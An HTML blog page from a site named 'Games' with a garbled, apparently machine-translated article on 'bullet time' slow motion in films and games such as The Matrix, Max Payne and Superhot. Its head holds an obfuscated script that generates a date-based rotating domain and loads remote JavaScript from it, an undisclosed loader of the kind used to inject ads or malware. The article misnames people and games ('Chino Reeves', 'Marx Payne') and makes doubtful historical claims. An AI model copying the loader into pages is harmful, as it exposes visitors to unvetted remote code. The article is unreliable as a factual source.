<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="Slow motion, a special effect shooting technique, often appears in the field of film and television, especially in various popular action films. Generally, slow motion will appear in the highly tense">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="Slow motion, a special effect shooting technique, often appears in the field of film and television, especially in various popular action films. Generally, slow motion will appear in the highly tense">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/8a65d9f019fc4d9f8da9f2e81200911d.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/b0c606dcad174cfc96d8b243f592cf08.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/766c069fee5b4af18f782b6e7b7a2424.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/31fea650dddc493987a107bf071bff84.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/6da9df0dcacc4e08a8ee7bd61198dc9e.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/9d9689d7244848d09fd0c4b737f7b9ac.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/d4be38bc2b5d4c8c993b7ee1348b437e.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/ca36c6b2e5574528950dee463be2a968.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:49.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game">
<meta name="twitter:description" content="Slow motion, a special effect shooting technique, often appears in the field of film and television, especially in various popular action films. Generally, slow motion will appear in the highly tense">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/8a65d9f019fc4d9f8da9f2e81200911d.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Slow motion, a special effect shooting technique, often appears in the field of film and television, especially in various popular action films. Generally, slow motion will appear in the highly tense segments of action movies, which can play an increasingly important role in improving the adrenaline level of the audience. When it comes to the most classic slow motion scenes in the film history, it is estimated that most people will think of the plot of Neo hiding from bullets in “matrix” played by Chino Reeves in those years. It is precisely because of this plot that this slow motion shooting technique is also known as “bullet time”.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/8a65d9f019fc4d9f8da9f2e81200911d.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>Later, the screen effect of video games gradually improved, and some games seemed to be in an action blockbuster in the overall experience, and the cinematic narrative and performance techniques began to be popular in the field of games, among which, naturally, the “bullet time” is a very eye-catching performance technique. Unlike movies, most of the time, players We can control the opening and closing of bullet time by ourselves, and decide when to slow motion has the final say.<br>The origin of<br>This technique is called “bullet time” perhaps because there are slow flying bullets and slow shots moving around the protagonist in the classic bridge section of matrix. Before this name was born, there were also the names of “time cutting” or “time freezing” in the film and television industry. The origin of “bullet time” can be traced back to the 1870s, when a photographer named Edward mibridge explored the instantaneity of shooting. At that time, the governor of California raised the question: can four legs of an animal leave the ground at the same time? For this question, some people say yes, some people say no, and they also say each other has its own reason. But if we look at it from the perspective of modern people, we will be more puzzled. It’s not about whether we can, but why we argue about it.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/b0c606dcad174cfc96d8b243f592cf08.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>Edward mibridge<br>The reason for the controversy is that some people have proposed that “quadruped may be able to leave the ground at the same time when it is moving at high speed”, and the thought and cognition of people at that time is obviously not enough to solve this problem, otherwise there will be no subsequent stories. In order to test this problem, Edward arranged many cameras on the racetrack of the racetrack, and each camera had a string across the racetrack. As long as the horse passed here, breaking the rope can trigger the shutter on the camera, so as to achieve the effect of continuous shooting. When the results come out, it turns out that animals can leave the ground with four legs at the same time. This shooting technique not only provides inspiration for later films, but also enables people to have a cognition of the speed and advance and retreat of actions through this experiment.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/766c069fee5b4af18f782b6e7b7a2424.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>Not just horses, but most of the self-sufficient creatures that can move at high speed</p>
<p>In any case, in the early years to achieve the effect of “bullet time” in the film is not an easy and expensive technology, but in dynamic animation or games to achieve this effect is much easier. According to the data, the first game in history that uses the bullet time effect is the RPG game “starquest: rescue at Rigel” launched by epxy company in 1980. Because of its science fiction background, it allows players to realize the bullet time effect in the game with the help of biochemical transplant device. But it’s worth mentioning that before the movie “matrix”, data showed that only this game used this effect.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/31fea650dddc493987a107bf071bff84.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>Starquest: rescue at Rigel game cover<br>After the “matrix” hit, the concept of “bullet time” began to spread, and many developers began to add this design to their own games. As mentioned above, bullet time is usually used in action games. It is worth mentioning that whether it is fighting, shooting or sports games, it can be called action games. In historical records, the first game to use modern bullet time effect is FPS game “Requiem: Revenge angel” released by retroism in 1999. Players often appear “bullet time” when fighting to avoid the enemy’s firepower and aim at the enemy more easily.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/6da9df0dcacc4e08a8ee7bd61198dc9e.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>“Requiem: Angel of revenge” is not famous though it is classic<br>And the game works that really carry forward the design of “bullet time” must have been heard by players from all walks of life, even if they haven’t played, “Marx Payne”, a work of both game name and human name. This is a TPS game. In the game, players can hold two guns like matrix or heroes, jump out of the bunker, dodge bullets and pour fire at the enemy. In this state, the game will start the bullet time mode. Players can clearly see the trajectory of bullets, and the surrounding sound effects will slow down Slow, but only the response of the protagonist can still be as usual. This kind of bloody fighting mode is really eye-catching. It’s like watching a movie directed by John Woo. In the era when video games didn’t use motion capture technology, few people can surpass the action and music and painting performance brought by Marx Payne to this day.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/9d9689d7244848d09fd0c4b737f7b9ac.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>By the third generation of the series, the combat system was excellent<br>In the field of racing games, the system of bullet time is not common now. In the earlier series of “the best flying car”, there is a system called “fast device”, which can also be called “fast response” system. This system was first launched in the ninth work of the series “the most wanted”. The purpose of this system is that the proportion of the police and bandits chasing is high, and the action is strong. Players often focus on the car with the police and ignore the road conditions, and the situation of hitting the car or stepping on the spiked belt often occurs. The existence of this system is to let players in a short time of slow motion Under the rapid response, players can easily avoid obstacles or pass through the more difficult corners, and the price is to exit the “fast device” and then find that the speed of the vehicle will be greatly reduced. I believe that no matter who first touches the system, they will think it’s something that can accelerate when they look at the name, but when they open it, they find that the speed doesn’t increase but decreases.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/d4be38bc2b5d4c8c993b7ee1348b437e.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>The orange metering slot above the dashboard is the “flying device”<br>Among all the games using bullet time, the most creative and favorite one is super hot, which is an FPS game. But the most unusual thing is that the full name of the game is in the state of “bullet time”. As long as the player stays in the original place, the time will pass very slowly. Once the perspective is rotated or moved, the time will be right Constant flow. The rule of the game is that no matter the protagonist and the enemy are killed in one shot, the protagonist needs one to many, and the enemy has all kinds of knives, guns, sticks and clubs in his hands. Using the characteristics of bullet time, the protagonist can plan his own actions in slow motion, push forward the time bit by bit and use all the objects around him to fight back. The trajectory of the bullet can be predicted to be chopped off, or thrown props to offset Block, or even split in two with a samurai knife. It is worth mentioning that when each level is completed, the game will replay the player’s actions at a normal speed, giving a feeling of operation like an action superstar.<br><img src="http://maiygu.xyz/2019/11/08/Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game/ca36c6b2e5574528950dee463be2a968.jpg" alt="Enjoy the elegant trajectory of bullets in the air and the use of bullet time in the game"><br>In the first person, it’s very exciting to feel the bullet passing by in slow motion<br>    concluding remarks<br>In the author’s mind, the scene most suitable for the combination of bullet time is the effect when the objects are destroyed except for the flight path of various bullets, such as the scene of close-up shooting and glass fragmentation in various games, especially the scene of explosion. The effect of slowly expanding the sense of tear is irresistible. Maybe this is the so-called “explosion is art”. In fact, no matter in the movie or in the game, the most important role of bullet time is to help the players to savor the moments of various wonderful scenes, which can make the scenes that are very hot in themselves more exciting and exciting.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/Expose the ugliness of capitalism, the unknown story behind the classic game the millionaire/" rel="next" title="Expose the ugliness of capitalism, the unknown story behind the classic game the millionaire">
                <i class="fa fa-chevron-left"></i> Expose the ugliness of capitalism, the unknown story behind the classic game the millionaire
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/Dream of sailing in the electronic world, past, present and future of navigation games/" rel="prev" title="Dream of sailing in the electronic world, past, present and future of navigation games">
                Dream of sailing in the electronic world, past, present and future of navigation games <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
